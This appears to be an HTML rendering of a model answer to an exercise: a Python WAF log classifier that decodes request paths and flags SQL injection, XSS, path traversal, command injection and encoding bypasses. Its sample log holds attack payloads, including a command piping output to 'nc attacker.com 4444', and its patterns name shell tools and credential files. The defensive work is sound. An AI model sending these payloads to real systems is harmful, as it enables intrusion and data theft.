@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q22_waf_classifier.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q22_waf_classifier.py</h1>
+  <p class="file-path">Source: code\log_parsing\answers\q22_waf_classifier.py</p>
+  <p class="line-count">273 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Q22. WAF Log Classifier
+=========================
+Detect SQL injection, XSS, path traversal, command injection, and
+common WAF bypass techniques from web application firewall logs.
+
+=============================================================================
+SOLUTION PROGRESSION
+=============================================================================
+
+NAIVE: Grep for &quot;UNION SELECT&quot; and &quot;script&gt;&quot;.
+  Problem: Attackers URL-encode, hex-encode, use case variation, insert
+  SQL comments, or split payloads across parameters. A static string
+  grep will have both false negatives (bypasses) and false positives.
+
+BETTER: Use a multi-pattern regex per attack type.
+  Problem: Doesn&#x27;t handle URL/double-URL encoding, nor does it detect
+  bypass techniques like `UNI/**/ON` or `&lt;scr%00ipt&gt;`.
+
+GOOGLE-LEVEL (this file):
+  - Normalize: URL-decode (up to 3 levels), strip null bytes, collapse
+    repeated whitespace/comments before matching.
+  - Category patterns: SQLi, XSS, path traversal, command injection.
+  - Bypass patterns: SQL comment injection, double encoding, null byte,
+    case-scrambling indicators (mixed-case SELECT).
+  - Score per event: additive weights; report sorted by severity.
+
+Complexity: O(N × P) where P = number of patterns.
+=============================================================================
+&quot;&quot;&quot;
+
+import re
+import sys
+from urllib.parse import unquote_plus
+from collections import defaultdict
+from datetime import datetime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAMPLE DATA
+# ─────────────────────────────────────────────────────────────────────────────
+
+SAMPLE_LOG = &quot;&quot;&quot;\
+2024-03-12T08:00:00Z src=1.1.1.1 method=GET path=/search?q=1%27%20UNION%20SELECT%20null--&amp;page=1 status=403 waf=BLOCK
+2024-03-12T08:00:01Z src=2.2.2.2 method=POST path=/login body=username=admin%27+OR+%271%27%3D%271&amp;password=x status=403 waf=BLOCK
+2024-03-12T08:00:02Z src=3.3.3.3 method=GET path=/search?q=&lt;script&gt;alert(1)&lt;/script&gt; status=403 waf=BLOCK
+2024-03-12T08:00:03Z src=4.4.4.4 method=GET path=/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E status=403 waf=BLOCK
+2024-03-12T08:00:04Z src=5.5.5.5 method=GET path=/file?name=../../etc/passwd status=403 waf=BLOCK
+2024-03-12T08:00:05Z src=6.6.6.6 method=GET path=/cmd?exec=ls%20-la%20%7C%20nc%20attacker.com%204444 status=403 waf=BLOCK
+2024-03-12T08:00:06Z src=7.7.7.7 method=GET path=/search?q=UNI%2F*%2A%2FON+SEL%2F*%2A%2FECT+1,2,3-- status=200 waf=PASS
+2024-03-12T08:00:07Z src=8.8.8.8 method=GET path=/search?q=%2525%2527%2520OR%25201%253D1-- status=200 waf=PASS
+2024-03-12T08:00:08Z src=9.9.9.9 method=GET path=/search?q=%00&lt;script&gt;alert(1)&lt;/script&gt; status=200 waf=PASS
+2024-03-12T08:01:00Z src=10.0.0.1 method=GET path=/api/health status=200 waf=PASS
+&quot;&quot;&quot;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DETECTION PATTERNS  (name, pattern, weight, description)
+# ─────────────────────────────────────────────────────────────────────────────
+
+# These are applied AFTER normalization of the input
+ATTACK_PATTERNS: list[tuple[str, re.Pattern, int, str]] = [
+    # SQL Injection
+    (&quot;SQLI_UNION&quot;,
+     re.compile(r&#x27;\bunion\s+(?:all\s+)?select\b&#x27;, re.IGNORECASE), 5,
+     &quot;UNION-based SQL injection&quot;),
+    (&quot;SQLI_BOOLEAN&quot;,
+     re.compile(r&quot;&#x27;\s*(?:or|and)\s+[&#x27;\&quot;0-9]+=&quot;, re.IGNORECASE), 4,
+     &quot;Boolean-based blind SQLi&quot;),
+    (&quot;SQLI_COMMENT_BYPASS&quot;,
+     re.compile(r&#x27;/\*[^*]*\*/\s*(union|select|or|and|from|where)&#x27;, re.IGNORECASE), 4,
+     &quot;SQL comment injection bypass&quot;),
+    (&quot;SQLI_TAUTOLOGY&quot;,
+     re.compile(r&quot;&#x27;\s*or\s+(?:&#x27;|\&quot;)?\s*\d+\s*=\s*\d+\s*(?:--|#|/\*)&quot;, re.IGNORECASE), 5,
+     &quot;Tautology SQLi&quot;),
+    (&quot;SQLI_STACKED&quot;,
+     re.compile(r&quot;;\s*(drop|insert|update|delete|create|exec)\s&quot;, re.IGNORECASE), 5,
+     &quot;Stacked query SQLi&quot;),
+
+    # XSS
+    (&quot;XSS_SCRIPT_TAG&quot;,
+     re.compile(r&#x27;&lt;script[\s&gt;]&#x27;, re.IGNORECASE), 5,
+     &quot;Script tag XSS&quot;),
+    (&quot;XSS_EVENT_HANDLER&quot;,
+     re.compile(r&#x27;\bon(?:load|error|click|mouseover|focus|blur)\s*=&#x27;, re.IGNORECASE), 4,
+     &quot;DOM event handler XSS&quot;),
+    (&quot;XSS_JAVASCRIPT_URI&quot;,
+     re.compile(r&#x27;javascript\s*:&#x27;, re.IGNORECASE), 4,
+     &quot;JavaScript URI XSS&quot;),
+    (&quot;XSS_EXPRESSION&quot;,
+     re.compile(r&#x27;expression\s*\(&#x27;, re.IGNORECASE), 3,
+     &quot;CSS expression XSS (IE)&quot;),
+
+    # Path Traversal
+    (&quot;PATH_TRAVERSAL&quot;,
+     re.compile(r&#x27;\.\.(?:/|\\)&#x27;, re.IGNORECASE), 4,
+     &quot;Directory traversal&quot;),
+    (&quot;PATH_TRAVERSAL_ENCODED&quot;,
+     re.compile(r&#x27;%2e%2e(?:%2f|%5c)&#x27;, re.IGNORECASE), 4,
+     &quot;Encoded directory traversal&quot;),
+    (&quot;SENSITIVE_FILE&quot;,
+     re.compile(r&#x27;(?:etc/passwd|etc/shadow|win\.ini|boot\.ini|web\.config)&#x27;, re.IGNORECASE), 5,
+     &quot;Sensitive file access attempt&quot;),
+
+    # Command Injection
+    (&quot;CMD_PIPE&quot;,
+     re.compile(r&#x27;[;|`]\s*(?:cat|ls|id|whoami|wget|curl|nc|bash|sh)\b&#x27;, re.IGNORECASE), 5,
+     &quot;Command injection via pipe/semicolon&quot;),
+    (&quot;CMD_SUBSHELL&quot;,
+     re.compile(r&#x27;\$\(.*?\)|\`[^`]+\`&#x27;, re.IGNORECASE), 4,
+     &quot;Command substitution injection&quot;),
+]
+
+# Bypass patterns (applied separately, additive score)
+BYPASS_PATTERNS: list[tuple[str, re.Pattern, int, str]] = [
+    (&quot;BYPASS_NULL_BYTE&quot;,
+     re.compile(r&#x27;\x00|%00&#x27;), 2,
+     &quot;Null byte WAF bypass attempt&quot;),
+    (&quot;BYPASS_DOUBLE_ENCODE&quot;,
+     re.compile(r&#x27;%25[0-9a-f]{2}&#x27;, re.IGNORECASE), 2,
+     &quot;Double URL encoding bypass&quot;),
+    (&quot;BYPASS_CASE_SCRAMBLE&quot;,
+     re.compile(r&#x27;(?:sElEcT|uNiOn|ScRiPt|aLeRt)&#x27;, re.IGNORECASE), 2,
+     &quot;Case-scrambling bypass (mixed case)&quot;),
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# NORMALIZER
+# ─────────────────────────────────────────────────────────────────────────────
+
+NULL_BYTE_RE     = re.compile(r&#x27;\x00|%00&#x27;, re.IGNORECASE)
+SQL_COMMENT_PASS = re.compile(r&#x27;/\*!\d*\s*&#x27;, re.IGNORECASE)  # MySQL inline comments
+
+
+def normalize(text: str) -&gt; str:
+    &quot;&quot;&quot;Decode URL encoding up to 3 levels, strip null bytes, collapse whitespace.&quot;&quot;&quot;
+    for _ in range(3):
+        decoded = unquote_plus(text)
+        if decoded == text:
+            break
+        text = decoded
+    text = NULL_BYTE_RE.sub(&quot;&quot;, text)
+    text = re.sub(r&#x27;\s+&#x27;, &#x27; &#x27;, text)
+    return text
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PARSER
+# ─────────────────────────────────────────────────────────────────────────────
+
+LOG_RE = re.compile(
+    r&#x27;(?P&lt;ts&gt;\S+)\s+src=(?P&lt;src&gt;\S+)\s+method=(?P&lt;method&gt;\S+)\s+&#x27;
+    r&#x27;path=(?P&lt;path&gt;\S+)\s+status=(?P&lt;status&gt;\d+)\s+waf=(?P&lt;waf&gt;\S+)&#x27;
+)
+
+
+def parse_line(line: str) -&gt; dict | None:
+    line = line.strip()
+    if not line:
+        return None
+    m = LOG_RE.match(line)
+    if not m:
+        return None
+    try:
+        ts = datetime.strptime(m.group(&quot;ts&quot;), &quot;%Y-%m-%dT%H:%M:%SZ&quot;).timestamp()
+    except ValueError:
+        return None
+    return {
+        &quot;ts&quot;:     ts,
+        &quot;src&quot;:    m.group(&quot;src&quot;),
+        &quot;method&quot;: m.group(&quot;method&quot;),
+        &quot;path&quot;:   m.group(&quot;path&quot;),
+        &quot;status&quot;: int(m.group(&quot;status&quot;)),
+        &quot;waf&quot;:    m.group(&quot;waf&quot;),
+    }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CLASSIFIER
+# ─────────────────────────────────────────────────────────────────────────────
+
+def classify(record: dict) -&gt; dict:
+    raw  = record[&quot;path&quot;]
+    norm = normalize(raw)
+
+    matched_attacks: list[dict] = []
+    matched_bypasses: list[dict] = []
+    score = 0
+
+    for name, pattern, weight, description in ATTACK_PATTERNS:
+        if pattern.search(norm):
+            matched_attacks.append({&quot;name&quot;: name, &quot;description&quot;: description, &quot;weight&quot;: weight})
+            score += weight
+
+    for name, pattern, weight, description in BYPASS_PATTERNS:
+        # Check bypass on raw (before decoding) to catch encoding tricks
+        if pattern.search(raw):
+            matched_bypasses.append({&quot;name&quot;: name, &quot;description&quot;: description, &quot;weight&quot;: weight})
+            score += weight
+
+    return {
+        **record,
+        &quot;attacks&quot;:  matched_attacks,
+        &quot;bypasses&quot;: matched_bypasses,
+        &quot;score&quot;:    score,
+        &quot;norm&quot;:     norm[:200],
+    }
+
+
+def risk_label(score: int, waf: str) -&gt; str:
+    label = &quot;LOW&quot;
+    if score &gt;= 8:
+        label = &quot;CRITICAL&quot;
+    elif score &gt;= 5:
+        label = &quot;HIGH&quot;
+    elif score &gt;= 3:
+        label = &quot;MEDIUM&quot;
+    if waf == &quot;PASS&quot; and score &gt; 0:
+        label += &quot;+BYPASS&quot;
+    return label
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# REPORT
+# ─────────────────────────────────────────────────────────────────────────────
+
+def ts_fmt(ts: float) -&gt; str:
+    return datetime.utcfromtimestamp(ts).strftime(&quot;%Y-%m-%dT%H:%M:%SZ&quot;)
+
+
+def print_report(results: list[dict]) -&gt; None:
+    print(&quot;=&quot; * 65)
+    print(&quot;WAF LOG CLASSIFICATION REPORT&quot;)
+    print(&quot;=&quot; * 65)
+
+    flagged = [r for r in results if r[&quot;score&quot;] &gt; 0]
+    flagged.sort(key=lambda x: x[&quot;score&quot;], reverse=True)
+
+    bypassed = [r for r in flagged if r[&quot;waf&quot;] == &quot;PASS&quot;]
+    blocked  = [r for r in flagged if r[&quot;waf&quot;] == &quot;BLOCK&quot;]
+
+    print(f&quot;\n[BYPASSED WAF] {len(bypassed)} event(s)  *** Needs immediate attention ***&quot;)
+    for r in bypassed:
+        label = risk_label(r[&quot;score&quot;], r[&quot;waf&quot;])
+        print(f&quot;\n  [{label}] src={r[&#x27;src&#x27;]}  ts={ts_fmt(r[&#x27;ts&#x27;])}&quot;)
+        print(f&quot;  path: {r[&#x27;path&#x27;][:80]}&quot;)
+        print(f&quot;  norm: {r[&#x27;norm&#x27;][:80]}&quot;)
+        for a in r[&quot;attacks&quot;] + r[&quot;bypasses&quot;]:
+            print(f&quot;    [{a[&#x27;name&#x27;]}] {a[&#x27;description&#x27;]}  weight={a[&#x27;weight&#x27;]}&quot;)
+
+    print(f&quot;\n[BLOCKED by WAF] {len(blocked)} event(s)&quot;)
+    for r in blocked:
+        label = risk_label(r[&quot;score&quot;], r[&quot;waf&quot;])
+        print(f&quot;  [{label}] src={r[&#x27;src&#x27;]}  score={r[&#x27;score&#x27;]}  &quot;
+              f&quot;attacks={[a[&#x27;name&#x27;] for a in r[&#x27;attacks&#x27;]]}  ts={ts_fmt(r[&#x27;ts&#x27;])}&quot;)
+    print(&quot;=&quot; * 65)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) &gt; 1:
+        with open(sys.argv[1], encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as fh:
+            raw_lines = fh.readlines()
+    else:
+        print(&quot;[INFO] Using embedded sample data.\n&quot;)
+        raw_lines = SAMPLE_LOG.splitlines(keepends=True)
+
+    records = [r for r in (parse_line(l) for l in raw_lines) if r is not None]
+    print(f&quot;Parsed {len(records)} WAF log entries.\n&quot;)
+    results = [classify(r) for r in records]
+    print_report(results)
+</code></pre>
+</body>
+</html>
